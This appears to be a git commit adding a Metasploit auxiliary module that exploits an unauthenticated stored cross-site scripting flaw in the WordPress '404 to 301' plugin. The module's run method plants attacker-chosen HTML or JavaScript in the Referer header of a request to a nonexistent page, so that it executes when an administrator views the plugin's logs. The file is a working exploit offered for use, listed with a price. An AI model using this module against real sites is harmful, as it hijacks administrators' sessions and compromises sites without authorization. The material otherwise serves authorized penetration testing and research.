6d858b9fa83b5cbb81ad840643e1f5653c6492e8
Brandon Perry <bperry.volatile@gmail.com>
2017-12-02 10:37:48 -0600

    wordpress 404 to 301 unauthed stored cross site scripting aux module

---
+++ modules/auxiliary/http/wp_404_to_301_xss.rb
@@ -0,0 +1,64 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Auxiliary
+
+  include Msf::Auxiliary::Report
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Wordpress 404 to 301 Plugin Persistent XSS',
+      'Description'    => %q{
+    This module exploits an unauthenticated stored cross-site scripting
+    vulnerability in the popular 404 to 301 plugin for Wordpress.
+
+    Versions 2.3.0 and below of the 404 to 301 Wordpress plugin were vulnerable to
+    an unauthenticated stored cross-site scripting vulnerability manifested in
+    the admin panel when viewing logs. This module exploits the vulnerability
+    to include arbitrary HTML/Javascript that will be run when an admin views
+    the logs. Fixed in version 2.3.1.
+
+    Categories: Open Source, Wordpress, XSS
+
+    Price: 3
+
+    Video: https://asciinema.org/a/dXgZ0q7gSrhxe0130xDZAyVhH
+
+    OS: Multi
+
+    Arch: Multi
+
+    Requirements: Metasploit Framework
+      },
+      'References'     =>
+        [
+        ],
+      'Author'         =>
+        [
+        ],
+      'License'        => 'VolatileMinds',
+      'DisclosureDate' => ''
+    ))
+
+    register_options(
+      [
+         OptString.new("TARGETURI", [true, 'The relative URI', '/']),
+         OptString.new("HTML", [true, 'The HTML to include as the cross-site scripting payload.', nil])
+      ], self.class)
+  end
+
+  def run
+    send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, 'index.php', Rex::Text.rand_text_alpha(10)),
+      'headers' => {
+        'Referer' => datastore['HTML']
+      }
+    })
+  end
+end
+
